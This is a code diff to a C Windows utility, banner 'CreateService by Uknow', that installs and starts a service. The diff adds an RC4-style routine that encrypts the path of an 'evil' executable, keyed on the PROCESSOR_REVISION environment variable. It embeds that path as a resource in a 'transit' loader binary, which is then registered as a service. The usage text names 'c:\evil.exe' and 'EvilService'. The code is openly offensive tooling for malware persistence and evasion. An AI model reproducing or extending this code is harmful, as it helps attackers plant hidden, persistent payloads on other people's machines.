@@ -77,20 +77,73 @@ BOOL SystemServiceOperate(char* lpszDriverPath, int iOperateType)
 
 	return TRUE;
 }
+void StreamCrypt(char * Data, long Length, char * Key, int KeyLength)
+{
+	int i = 0, j = 0;
+	char k[256] = { 0 }, s[256] = { 0 };
+	char tmp = 0;
+	for (i = 0; i < 256; i++)
+	{
+		s[i] = i;
+		k[i] = Key[i%KeyLength];
+	}
+	for (i = 0; i < 256; i++)
+	{
+		j = (j + s[i] + k[i]) % 256;
+		tmp = s[i];
+		s[i] = s[j];
+		s[j] = tmp;
+	}
+	int t = 0;
+	i = 0, j = 0, tmp = 0;
+	int l = 0;
+	for (l = 0; l < Length; l++)
+	{
+		i = (i + 1) % 256;
+		j = (j + s[i]) % 256;
+		tmp = s[i];
+		s[i] = s[j];
+		s[j] = tmp;
+		t = (s[i] + s[j]) % 256;
+		Data[l] ^= s[t];
+	}
+}
+
+BOOL AddResource(char* outpath, char* exepath)
+{
+	StreamCrypt(exepath, strlen(exepath), getenv("PROCESSOR_REVISION"), strlen(getenv("PROCESSOR_REVISION")));
+	char Path[256] = {};
+	strcpy(Path, exepath);
+	HANDLE  hResource = BeginUpdateResource(outpath, FALSE);
+	if (NULL != hResource)
+	{
+		if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), Path, strlen(Path)) != FALSE)
+		{
+			EndUpdateResource(hResource, FALSE);
+			return 1;
+		}
+	}
+	return 0;
+}
+
 
 int main(int argc, TCHAR* argv[])
 {
 	BOOL bRet = FALSE;
 	char* szFileName = argv[1];
-	szName = argv[2];
+	szName = argv[3];
 	printf("[*] CreateService by Uknow\n");
-	if (argc != 4)
+	if (argc != 5)
 	{
-		printf("   [+] usage: %s BinaryPathName ServiceName start/stop\n", argv[0]);
-		printf("   [+] eg: %s \"c:\\evil.exe\" EvilService start/stop\n", argv[0]);
+		printf("   [+] usage: %s TransitPathName EvilPathName ServiceName start/stop\n", argv[0]);
+		printf("   [+] eg: %s \"c:\\transit.exe\" \"c:\\evil.exe\" EvilService start/stop\n", argv[0]);
 		return -1;
 	}
-	else if (strcmp(argv[3], "start") == 0) {
+	else if (strcmp(argv[4], "start") == 0) {
+		if (!AddResource(argv[1], argv[2]))
+		{
+			return -1;
+		}
 		bRet = SystemServiceOperate(szFileName, 0);
 		if (FALSE == bRet)
 		{
@@ -104,11 +157,12 @@ int main(int argc, TCHAR* argv[])
 			return -1;
 		}
 		printf("    [+] ServiceName: %s\n", szName);
-		printf("    [+] BinaryPathName: %s\n", szFileName);
+		printf("    [+] TransitPathName: %s\n", szFileName);
+		printf("    [+] EvilPathName: %s\n", argv[2]);
 		printf("    [+] Success! Service successfully Create and Start.\n");
 		return 0;
 	}
-	else if (strcmp(argv[3], "stop") == 0)
+	else if (strcmp(argv[4], "stop") == 0)
 	{
 		bRet = SystemServiceOperate(szFileName, 2);
 		if (FALSE == bRet)
@@ -123,7 +177,8 @@ int main(int argc, TCHAR* argv[])
 			return -1;
 		}
 		printf("    [+] ServiceName: %s\n", szName);
-		printf("    [+] BinaryPathName: %s\n", szFileName);
+		printf("    [+] TransitPathName: %s\n", szFileName);
+		printf("    [+] EvilPathName: %s\n", argv[2]);
 		printf("    [+] Success! Service successfully Stop and Delete.\n");
 		return 0;
 	}
